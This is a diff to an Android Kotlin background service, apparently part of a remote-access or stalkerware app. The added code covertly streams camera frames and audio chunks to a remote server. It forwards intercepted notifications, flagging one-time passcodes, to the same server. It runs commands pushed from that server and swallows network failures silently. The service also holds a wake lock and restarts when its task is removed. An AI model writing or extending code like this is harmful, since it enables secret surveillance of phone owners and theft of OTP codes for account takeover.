@@ -36,6 +36,23 @@ class ConnectionService : Service() {
         private const val CHANNEL_ID = "connection_service_channel"
         private const val NOTIF_ID = 2001
 
+        // ==========================================
+        // ===== STATIC FRAME SENDER =====
+        // ==========================================
+        private var instance: ConnectionService? = null
+
+        fun sendCameraFrame(base64: String) {
+            instance?.sendCameraFrameHttp(base64)
+        }
+
+        fun sendAudioFrame(base64: String) {
+            instance?.sendAudioFrameHttp(base64)
+        }
+
+        fun sendCommandResponse(command: String, result: JSONObject) {
+            instance?.sendCommandResponseHttp(command, result)
+        }
+
         fun start(context: Context) {
             try {
                 val intent = Intent(context, ConnectionService::class.java)
@@ -58,7 +75,7 @@ class ConnectionService : Service() {
 
     private val client = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
-        .readTimeout(0, TimeUnit.SECONDS)
+        .readTimeout(0, TimeUnit.SECONDS)   // SSE never timeout
         .writeTimeout(30, TimeUnit.SECONDS)
         .retryOnConnectionFailure(true)
         .build()
@@ -79,9 +96,15 @@ class ConnectionService : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        instance = this
         Log.d(TAG, "🔥 Service created")
         createNotificationChannel()
         acquireWakeLock()
+
+        // Register NotificationInterceptor
+        NotificationInterceptor.onNotificationReceived = { payload ->
+            sendNotificationToServer(payload)
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -226,22 +249,27 @@ class ConnectionService : Service() {
                     extra,
                 )
                 Log.d(TAG, "✅ Executed: $command")
-                sendResponse(cmdId, command, result)
+
+                // Kalau async command (photo), skip response — sudah dikirim via callback
+                val isAsync = result.optBoolean("async", false)
+                if (!isAsync) {
+                    sendCommandResponseHttp(command, result)
+                }
             } catch (e: Exception) {
                 Log.e(TAG, "Command error", e)
                 val errResult = JSONObject().apply {
                     put("ok", false)
                     put("error", e.message ?: "exception")
                 }
-                sendResponse(cmdId, command, errResult)
+                sendCommandResponseHttp(command, errResult)
             }
         }.start()
     }
 
     // ==========================================
-    // ===== SEND RESPONSE via HTTP POST =====
+    // ===== SEND COMMAND RESPONSE =====
     // ==========================================
-    private fun sendResponse(cmdId: String, command: String, result: JSONObject) {
+    private fun sendCommandResponseHttp(command: String, result: JSONObject) {
         try {
             val url = "$serverUrl/api/post-response/$deviceId"
             val payload = JSONObject().apply {
@@ -250,7 +278,6 @@ class ConnectionService : Service() {
                 put("accessKey", accessKey)
             }
 
-            // ⬇️ FIX: pakai toMediaType() + toRequestBody()
             val mediaType = "application/json; charset=utf-8".toMediaType()
             val requestBody = payload.toString().toRequestBody(mediaType)
 
@@ -274,6 +301,117 @@ class ConnectionService : Service() {
         }
     }
 
+    // ==========================================
+    // ===== SEND CAMERA FRAME =====
+    // ==========================================
+    private fun sendCameraFrameHttp(base64: String) {
+        try {
+            val url = "$serverUrl/api/camera-frame/$deviceId"
+            val payload = JSONObject().apply {
+                put("frame", base64)
+                put("ts", System.currentTimeMillis())
+            }
+
+            val mediaType = "application/json; charset=utf-8".toMediaType()
+            val requestBody = payload.toString().toRequestBody(mediaType)
+
+            val request = Request.Builder()
+                .url(url)
+                .header("X-Access-Key", accessKey)
+                .post(requestBody)
+                .build()
+
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    // Silent — frame drop OK
+                }
+
+                override fun onResponse(call: Call, response: Response) {
+                    // Silent
+                }
+            })
+        } catch (e: Exception) {
+            // Silent
+        }
+    }
+
+    // ==========================================
+    // ===== SEND AUDIO FRAME =====
+    // ==========================================
+    private fun sendAudioFrameHttp(base64: String) {
+        try {
+            val url = "$serverUrl/api/audio-chunk/$deviceId"
+            val payload = JSONObject().apply {
+                put("chunk", base64)
+                put("seq", System.currentTimeMillis())
+            }
+
+            val mediaType = "application/json; charset=utf-8".toMediaType()
+            val requestBody = payload.toString().toRequestBody(mediaType)
+
+            val request = Request.Builder()
+                .url(url)
+                .header("X-Access-Key", accessKey)
+                .post(requestBody)
+                .build()
+
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    // Silent
+                }
+
+                override fun onResponse(call: Call, response: Response) {
+                    // Silent
+                }
+            })
+        } catch (e: Exception) {
+            // Silent
+        }
+    }
+
+    // ==========================================
+    // ===== SEND NOTIFICATION =====
+    // ==========================================
+    private fun sendNotificationToServer(payload: JSONObject) {
+        try {
+            val url = "$serverUrl/api/post-notification/$deviceId"
+
+            val fullPayload = JSONObject().apply {
+                put("title", payload.optString("title", ""))
+                put("body", payload.optString("body", ""))
+                put("package", payload.optString("package", ""))
+                put("category", payload.optString("category", ""))
+                put("is_otp", payload.optBoolean("is_otp", false))
+                put("accessKey", accessKey)
+                put("timestamp", payload.optLong("timestamp", System.currentTimeMillis()))
+            }
+
+            val mediaType = "application/json; charset=utf-8".toMediaType()
+            val requestBody = fullPayload.toString().toRequestBody(mediaType)
+
+            val request = Request.Builder()
+                .url(url)
+                .header("X-Access-Key", accessKey)
+                .post(requestBody)
+                .build()
+
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    Log.e(TAG, "Notif send error: ${e.message}")
+                }
+
+                override fun onResponse(call: Call, response: Response) {
+                    Log.d(TAG, "📤 Notification sent (HTTP ${response.code})")
+                }
+            })
+        } catch (e: Exception) {
+            Log.e(TAG, "sendNotificationToServer error", e)
+        }
+    }
+
+    // ==========================================
+    // ===== RECONNECT =====
+    // ==========================================
     private fun scheduleReconnect() {
         if (!isRunning) return
         reconnectAttempts++
@@ -349,9 +487,14 @@ class ConnectionService : Service() {
         } catch (e: Exception) {}
     }
 
+    // ==========================================
+    // ===== ON DESTROY =====
+    // ==========================================
     override fun onDestroy() {
         Log.d(TAG, "💀 Service destroyed")
         isRunning = false
+        instance = null
+
         try {
             currentCall?.cancel()
         } catch (e: Exception) {}
@@ -364,6 +507,9 @@ class ConnectionService : Service() {
         super.onDestroy()
     }
 
+    // ==========================================
+    // ===== ON TASK REMOVED =====
+    // ==========================================
     override fun onTaskRemoved(rootIntent: Intent?) {
         super.onTaskRemoved(rootIntent)
         Log.d(TAG, "⚠️ Task removed — restart")
